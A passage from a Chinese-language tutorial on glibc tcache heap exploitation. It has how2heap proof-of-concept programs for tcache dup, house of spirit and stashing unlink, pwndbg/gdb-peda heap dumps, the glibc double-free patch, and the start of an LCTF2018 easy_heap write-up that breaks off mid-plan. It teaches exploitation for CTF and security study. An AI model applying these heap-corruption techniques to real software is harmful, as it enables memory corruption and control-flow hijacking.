05:0028│          0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│          0x7fffffffdfd0 ?— 0x0
07:0038│          0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> i r rax
rax            0x7fffffffdfa8	140737488347048
```
可以看出 `tcache posioning` 這種方法和 fastbin attack 類似，但因爲沒有 size 的限制有了更大的利用範圍。

#### tcache dup
類似 `fastbin dup`，不過利用的是 `tcache_put()` 的不嚴謹
```C
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```
可以看出，`tcache_put()` 的檢查也可以忽略不計（甚至沒有對 `tcache->counts[tc_idx]` 的檢查），大幅提高性能的同時安全性也下降了很多。

因爲沒有任何檢查，所以我們可以對同一個 chunk 多次 free，造成 cycliced list。

以 how2heap 的 [tcache_dup](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c) 爲例分析，源碼如下：
```C
glibc_2.26 [master●] bat ./tcache_dup.c 
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: ./tcache_dup.c
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ 
   4   │ int main()
   5   │ {
   6   │         fprintf(stderr, "This file demonstrates a simple double-free attack with
       │  tcache.\n");
   7   │ 
   8   │         fprintf(stderr, "Allocating buffer.\n");
   9   │         int *a = malloc(8);
  10   │ 
  11   │         fprintf(stderr, "malloc(8): %p\n", a);
  12   │         fprintf(stderr, "Freeing twice...\n");
  13   │         free(a);
  14   │         free(a);
  15   │ 
  16   │         fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
  17   │         fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", ma
       │ lloc(8), malloc(8));
  18   │ 
  19   │         return 0;
  20   │ }
───────┴─────────────────────────────────────────────────────────────────────────────────
```

調試一下，第一次 free
```asm
pwndbg> n
14		free(a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0x1
 RSI  0x555555756010 ?— 0x1
 R8   0x0
 R9   0x7fffffffb79c ?— 0x1a00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0b0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RIP  0x5555555547fc (main+162) ?— mov    rax, qword ptr [rbp - 0x18]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555547e4 <main+138>    lea    rdi, [rip + 0x171]
   0x5555555547eb <main+145>    call   fwrite@plt <0x555555554630>
 
   0x5555555547f0 <main+150>    mov    rax, qword ptr [rbp - 0x18]
   0x5555555547f4 <main+154>    mov    rdi, rax
   0x5555555547f7 <main+157>    call   free@plt <0x555555554600>
 
 ? 0x5555555547fc <main+162>    mov    rax, qword ptr [rbp - 0x18]
   0x555555554800 <main+166>    mov    rdi, rax
   0x555555554803 <main+169>    call   free@plt <0x555555554600>
 
   0x555555554808 <main+174>    mov    rax, qword ptr [rip + 0x200851] <0x555555755060>
   0x55555555480f <main+181>    mov    rcx, qword ptr [rbp - 0x18]
   0x555555554813 <main+185>    mov    rdx, qword ptr [rbp - 0x18]
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
    9 	int *a = malloc(8);
   10 
   11 	fprintf(stderr, "malloc(8): %p\n", a);
   12 	fprintf(stderr, "Freeing twice...\n");
   13 	free(a);
 ? 14 	free(a);
   15 
   16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
   17 	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
   18 
   19 	return 0;
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
02:0010│      0x7fffffffdfc0 —? 0x7fffffffe0b0 ?— 0x1
03:0018│      0x7fffffffdfc8 ?— 0x0
04:0020│ rbp  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfd8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfe0 ?— 0x0
07:0038│      0x7fffffffdfe8 —? 0x7fffffffe0b8 —? 0x7fffffffe3d8 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555756270 (size : 0x20d90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x555555756260
```
tcache 的第一條鏈放入了一個 chunk

第二次 free 時，雖然 free 的是同一個 chunk，但因爲 `tcache_put()` 沒有做任何檢查，因此程序不會 crash
```asm
pwndbg> n
16		fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x555555756260 ?— 0x555555756260 /* '`buUUU' */
 RDI  0x2
 RSI  0x555555756010 ?— 0x2
 R8   0x1
 R9   0x7fffffffb79c ?— 0x1a00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0b0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RIP  0x555555554808 (main+174) ?— mov    rax, qword ptr [rip + 0x200851]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555547f4 <main+154>    mov    rdi, rax
   0x5555555547f7 <main+157>    call   free@plt <0x555555554600>
 
   0x5555555547fc <main+162>    mov    rax, qword ptr [rbp - 0x18]
   0x555555554800 <main+166>    mov    rdi, rax
   0x555555554803 <main+169>    call   free@plt <0x555555554600>
 
 ? 0x555555554808 <main+174>    mov    rax, qword ptr [rip + 0x200851] <0x555555755060>
   0x55555555480f <main+181>    mov    rcx, qword ptr [rbp - 0x18]
   0x555555554813 <main+185>    mov    rdx, qword ptr [rbp - 0x18]
   0x555555554817 <main+189>    lea    rsi, [rip + 0x152]
   0x55555555481e <main+196>    mov    rdi, rax
   0x555555554821 <main+199>    mov    eax, 0
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   11 	fprintf(stderr, "malloc(8): %p\n", a);
   12 	fprintf(stderr, "Freeing twice...\n");
   13 	free(a);
   14 	free(a);
   15 
 ? 16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
   17 	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
   18 
   19 	return 0;
   20 }
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x555555756260 /* '`buUUU' */
02:0010│      0x7fffffffdfc0 —? 0x7fffffffe0b0 ?— 0x1
03:0018│      0x7fffffffdfc8 ?— 0x0
04:0020│ rbp  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfd8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfe0 ?— 0x0
07:0038│      0x7fffffffdfe8 —? 0x7fffffffe0b8 —? 0x7fffffffe3d8 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555756270 (size : 0x20d90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x555555756260 --> 0x555555756260 (overlap chunk with 0x555555756250(freed) )
```
可以看出，這種方法與 `fastbin dup` 相比也簡單了很多。

#### tcache perthread corruption
我們已經知道 `tcache_perthread_struct` 是整個 tcache 的管理結構，如果能控制這個結構體，那麼無論我們 malloc 的 size 是多少，地址都是可控的。

這裏沒找到太好的例子，自己想了一種情況

設想有如下的堆排布情況
```
tcache_    +------------+
\perthread |......      |
\_struct   +------------+
           |counts[i]   |
           +------------+
           |......      |          +----------+
           +------------+          |header    |
           |entries[i]  |--------->+----------+
           +------------+          |NULL      |
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
```
通過一些手段（如 `tcache posioning`），我們將其改爲了
```
tcache_    +------------+<---------------------------+
\perthread |......      |                            |
\_struct   +------------+                            |
           |counts[i]   |                            |
           +------------+                            |
           |......      |          +----------+      |
           +------------+          |header    |      |
           |entries[i]  |--------->+----------+      |
           +------------+          |target    |------+
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
```
這樣，兩次 malloc 後我們就返回了 `tcache_perthread_struct` 的地址，就可以控制整個 tcache 了。

**因爲 tcache_perthread_struct 也在堆上，因此這種方法一般只需要 partial overwrite 就可以達到目的。**



#### tcache house of spirit

拿 how2heap 的源碼來講：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.\n");
	fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
	fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
	fprintf(stderr, "(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

	fprintf(stderr, "Ok. Let's start with the example!.\n\n");


	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10]; //fake chunk region

	fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

	fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size


	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

	a = &fake_chunks[2];

	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a);

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```



攻擊之後的目的是，去控制棧上的內容，malloc 一塊 chunk ，然後我們通過在棧上 fake 的chunk，然後去 free 掉他，我們會發現

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x4052e0 (size : 0x20d20)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffe510 --> 0x401340
```



Tcache 裏就存放了一塊 棧上的內容，我們之後只需 malloc，就可以控制這塊內存。

#### smallbin unlink

在smallbin中包含有空閒塊的時候，會同時將同大小的其他空閒塊，放入tcache中，此時也會出現解鏈操作，但相比於unlink宏，缺少了鏈完整性校驗。因此，原本unlink操作在該條件下也可以使用。

#### tcache stashing unlink attack

這種攻擊利用的是 tcache bin 有剩餘(數量小於 `TCACHE_MAX_BINS` )時，同大小的small bin會放進tcache中(這種情況可以用  `calloc` 分配同大小堆塊觸發，因爲 `calloc` 分配堆塊時不從 tcache bin 中選取)。在獲取到一個 `smallbin` 中的一個chunk後會如果 tcache 仍有足夠空閒位置，會將剩餘的 small bin 鏈入 tcache ，在這個過程中只對第一個 bin 進行了完整性檢查，後面的堆塊的檢查缺失。當攻擊者可以寫一個small bin的bk指針時，其可以在任意地址上寫一個libc地址(類似 `unsorted bin attack` 的效果)。構造得當的情況下也可以分配 fake chunk 到任意地址。

這裏以 `how2heap` 中的 `tcache_stashing_unlink_attack.c` 爲例。

我們按照釋放的先後順序稱 `smallbin[sz]` 中的兩個 chunk 分別爲 chunk0 和 chunk1。我們修改 chunk1 的 `bk` 爲 `fake_chunk_addr`。同時還要在 `fake_chunk_addr->bk` 處提前寫一個可寫地址 `writable_addr` 。調用 `calloc(size-0x10)` 的時候會返回給用戶 chunk0 (這是因爲 smallbin 的 `FIFO` 分配機制)，假設 `tcache[sz]` 中有 5 個空閒堆塊，則有足夠的位置容納 `chunk1` 以及 `fake_chunk` 。在源碼的檢查中，只對第一個 chunk 的鏈表完整性做了檢測 `__glibc_unlikely (bck->fd != victim)` ，後續堆塊在放入過程中並沒有檢測。

因爲tcache的分配機制是 `LIFO` ，所以位於 `fake_chunk->bk` 指針處的 `fake_chunk` 在鏈入 tcache 的時候反而會放到鏈表表頭。在下一次調用 `malloc(sz-0x10)` 時會返回 `fake_chunk+0x10` 給用戶，同時，由於 `bin->bk = bck;bck->fd = bin;` 的unlink操作，會使得 `writable_addr+0x10` 處被寫入一個 libc 地址。

```c

#include <stdio.h>
#include <stdlib.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    fprintf(stderr, "This file demonstrates the stashing unlink attack on tcache.\n\n");
    fprintf(stderr, "This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n");
    fprintf(stderr, "This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    fprintf(stderr, "The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    fprintf(stderr, "This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    // stack_var emulate the fake_chunk we want to alloc to
    fprintf(stderr, "Stack_var emulates the fake chunk we want to alloc to.\n\n");
    fprintf(stderr, "First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    fprintf(stderr, "You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    fprintf(stderr, "Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    fprintf(stderr, "Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 tcache
    fprintf(stderr, "Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    fprintf(stderr, "As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    fprintf(stderr, "Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);//>0x90

    //now 5 tcache bins
    fprintf(stderr, "Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    fprintf(stderr, "Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    fprintf(stderr, "Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    fprintf(stderr, "Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    fprintf(stderr, "As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);
    return 0;
}
```

這個 poc 用棧上的一個數組上模擬 `fake_chunk` 。首先構造出5個 `tcache chunk` 和2個 `smallbin chunk` 的情況。模擬 `UAF` 漏洞修改 `bin2->bk` 爲 `fake_chunk` ，在 `calloc(0x90)` 的時候觸發攻擊。

我們在 `calloc` 處下斷點，調用前查看堆塊排布情況。此時 `tcache[0xa0]` 中有 5 個空閒塊。可以看到 chunk1->bk 已經被改爲了 `fake_chunk_addr` 。而 `fake_chunk->bk` 也寫上了一個可寫地址。由於 `smallbin` 是按照 `bk` 指針尋塊的，分配得到的順序應當是 `0x0000000000603250->0x0000000000603390->0x00007fffffffdbc0 (FIFO)` 。調用 calloc 會返回給用戶 `0x0000000000603250+0x10`。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x6038a0 (size : 0x20760) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x0a0)  smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x0 and 0x603390 is broken)
(0xa0)   tcache_entry[8](5): 0x6036c0 --> 0x603620 --> 0x603580 --> 0x6034e0 --> 0x603440
gdb-peda$ x/4gx 0x603390
0x603390:       0x0000000000000000      0x00000000000000a1
0x6033a0:       0x0000000000603250      0x00007fffffffdbc0
gdb-peda$ x/4gx 0x00007fffffffdbc0
0x7fffffffdbc0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbd0: 0x0000000000000000      0x00007fffffffdbd0
gdb-peda$ x/4gx 0x0000000000603250
0x603250:       0x0000000000000000      0x00000000000000a1
0x603260:       0x00007ffff7dcfd30      0x0000000000603390
gdb-peda$ x/4gx 0x00007ffff7dcfd30
0x7ffff7dcfd30 <main_arena+240>:        0x00007ffff7dcfd20      0x00007ffff7dcfd20
0x7ffff7dcfd40 <main_arena+256>:        0x0000000000603390      0x0000000000603250
```

調用 calloc 後再查看堆塊排布情況，可以看到 `fake_chunk` 已經被鏈入 `tcache_entry[8]` ,且因爲分配順序變成了 `LIFO` , `0x7fffffffdbd0-0x10` 這個塊被提到了鏈表頭，下次 `malloc(0x90)` 即可獲得這個塊。

其 fd 指向下一個空閒塊，在 unlink 過程中 `bck->fd=bin` 的賦值操作使得 `0x00007fffffffdbd0+0x10` 處寫入了一個 libc 地址。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x6038a0 (size : 0x20760) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x0a0)  smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x6033a0 and 0x603390 is broken)
(0xa0)   tcache_entry[8](7): 0x7fffffffdbd0 --> 0x6033a0 --> 0x6036c0 --> 0x603620 --> 0x603580 --> 0x6034e0 --> 0x603440
gdb-peda$ x/4gx 0x7fffffffdbd0
0x7fffffffdbd0: 0x00000000006033a0      0x00007fffffffdbd0
0x7fffffffdbe0: 0x00007ffff7dcfd30      0x0000000000000000
```

####  libc leak

在以前的libc 版本中，我們只需這樣：

```c
#include <stdlib.h>
#include <stdio.h>

int main()
{
	long *a = malloc(0x1000);
	malloc(0x10);
	free(a);
	printf("%p\n",a[0]);
} 
```



但是在2.26 之後的 libc 版本後，我們首先得先把tcache 填滿：

```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc , char* argv[])
{
	long* t[7];
	long *a=malloc(0x100);
	long *b=malloc(0x10);
	
	// make tcache bin full
	for(int i=0;i<7;i++)
		t[i]=malloc(0x100);
	for(int i=0;i<7;i++)
		free(t[i]);
	
	free(a);
	// a is put in an unsorted bin because the tcache bin of this size is full
	printf("%p\n",a[0]);
} 
```

之後，我們就可以 leak libc 了。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559af0 (size : 0x20510)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x555555559250 (size : 0x110)
(0x110)   tcache_entry[15]: 0x5555555599f0 --> 0x5555555598e0 --> 0x5555555597d0 --> 0x5555555596c0 --> 0x5555555595b0 --> 0x5555555594a0 --> 0x555555559390
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk
0x555555559000      0x0                 0x250                Used                None              None
0x555555559250      0x0                 0x110                Freed     0x7ffff7fc0ca0    0x7ffff7fc0ca0
0x555555559360      0x110               0x20                 Used                None              None
0x555555559380      0x0                 0x110                Used                None              None
0x555555559490      0x0                 0x110                Used                None              None
0x5555555595a0      0x0                 0x110                Used                None              None
0x5555555596b0      0x0                 0x110                Used                None              None
```



### 0x04 Tcache Check

在最新的 libc 的[commit](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7) 中更新了 Tcache 的 double free 的check：

```c
index 6d7a6a8..f730d7a 100644 (file)
--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size)
 typedef struct tcache_entry
 {
   struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  struct tcache_perthread_struct *key;
 } tcache_entry;
 
 /* There is one of these for each thread, which contains the
@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)
 {
   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
   assert (tc_idx < TCACHE_MAX_BINS);
+
+  /* Mark this chunk as "in the tcache" so the test in _int_free will
+     detect a double free.  */
+  e->key = tcache;
+
   e->next = tcache->entries[tc_idx];
   tcache->entries[tc_idx] = e;
   ++(tcache->counts[tc_idx]);
@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx)
   assert (tcache->entries[tc_idx] > 0);
   tcache->entries[tc_idx] = e->next;
   --(tcache->counts[tc_idx]);
+  e->key = NULL;
   return (void *) e;
 }
 
@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock)
   {
     size_t tc_idx = csize2tidx (size);
 
+    /* Check to see if it's already in the tcache.  */
+    tcache_entry *e = (tcache_entry *) chunk2mem (p);
+
+    /* This test succeeds on double free.  However, we don't 100%
+       trust it (it also matches random payload data at a 1 in
+       2^<size_t> chance), so verify it's not an unlikely coincidence
+       before aborting.  */
+    if (__glibc_unlikely (e->key == tcache && tcache))
+      {
+       tcache_entry *tmp;
+       LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
+       for (tmp = tcache->entries[tc_idx];
+            tmp;
+            tmp = tmp->next)
+         if (tmp == e)
+           malloc_printerr ("free(): double free detected in tcache 2");
+       /* If we get here, it was a coincidence.  We've wasted a few
+          cycles, but don't abort.  */
+      }
+
     if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
```



目前爲止，只看到了在 free 操作的時候的 check ，似乎沒有對 get 進行新的check。

### 0x05 The pwn of CTF

#### Challenge 1 : LCTF2018 PWN easy_heap

##### 基本信息

遠程環境中的 libc 是 libc-2.27.so ，所以堆塊申請釋放過程中需要考慮 Tcache 。

```shell
zj@zj-virtual-machine:~/c_study/lctf2018/easy$ checksec ./easy_heap
[*] '/home/zj/c_study/lctf2018/easy/easy_heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

##### 基本功能

0. 輸入函數：循環讀入一個字節，如果出現 null 字節或是換行符則停止讀入，之後對當前讀入的末尾位置和 size 位置進行置零操作。
1. new: 使用 `malloc(0xa8)` 分配一個塊，記錄下 size ，輸入內容。
2. free: 首先根據記錄下的 size 對堆塊進行 `memset` 清零，之後進行常規 free
3. show：使用 puts 進行輸出

功能較爲簡單。

記錄一個 chunk 結構的結構體：

```c
struct Chunk {
    char *content;
    int size;
};
```

使用了一個在堆上分配的結構來記錄所有 `Chunk` 結構體，一共可以分配 10 個塊。

程序的讀入輸入函數存在一個 null-byte-overflow 漏洞 ，具體見如下代碼

```c
unsigned __int64 __fastcall read_input(_BYTE *malloc_p, int sz)
{
  unsigned int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  i = 0;                                        
  if ( sz )
  {
    while ( 1 )
    {
      read(0, &malloc_p[i], 1uLL);
      if ( sz - 1 < i || !malloc_p[i] || malloc_p[i] == '\n' )
        break;
      ++i;
    }
    malloc_p[i] = 0;
    malloc_p[sz] = 0;                           // null-byte-overflow
  }
  else
  {
    *malloc_p = 0;
  }
  return __readfsqword(0x28u) ^ v4;
}
```

##### 利用思路

由於存在 tcache ，所以利用過程中需要考慮到 tcache 的存在。

通常來講在堆程序中出現 null-byte-overflow 漏洞 ，都會考慮構造 overlapping heap chunk ，使得 overlapping chunk 可以多次使用 ，達到信息泄露最終劫持控制流的目的 。

null-byte-overflow 漏洞的利用方法通過溢出覆蓋 prev_in_use 字節使得堆塊進行合併，然後使用僞造的 prev_size 字段使得合併時造成堆塊交叉。但是本題由於輸入函數無法輸入 NULL 字符，所以無法輸入 prev_size 爲 0x_00 的值，而堆塊分配大小是固定的，所以直接採用 null-byte-overflow 的方法無法進行利用，需要其他方法寫入 prev_size 。

在沒有辦法手動寫入 prev_size ，但又必須使用 prev_size 纔可以進行利用的情況下，考慮使用系統寫入的 prev_size 。

方法爲：在 unsorted bin 合併時會寫入 prev_size，而該 prev_size 不會被輕易覆蓋（除非有新的 prev_size 需要寫入），所以可以利用該 prev_size 進行利用。

具體過程：

1. 將 `A -> B -> C` 三塊 unsorted bin chunk 依次進行釋放
2. A 和 B 合併，此時 C 前的 prev_size 寫入爲 0x200
3. A  、 B  、 C 合併，步驟 2 中寫入的 0x200 依然保持
4. 利用 unsorted bin 切分，分配出 A 
5. 利用 unsorted bin 切分，分配出 B，注意此時不要覆蓋到之前的 0x200
6. 將 A 再次釋放爲 unsorted bin 的堆塊，使得 fd 和 bk 爲有效鏈表指針
7. 此時 C 前的 prev_size 依然爲 0x200（未使用到的值），A B C 的情況： `A (free) -> B (allocated) -> C (free)`，如果使得 B 進行溢出，則可以將已分配的 B 塊包含在合併後的釋放狀態 unsorted bin 塊中。

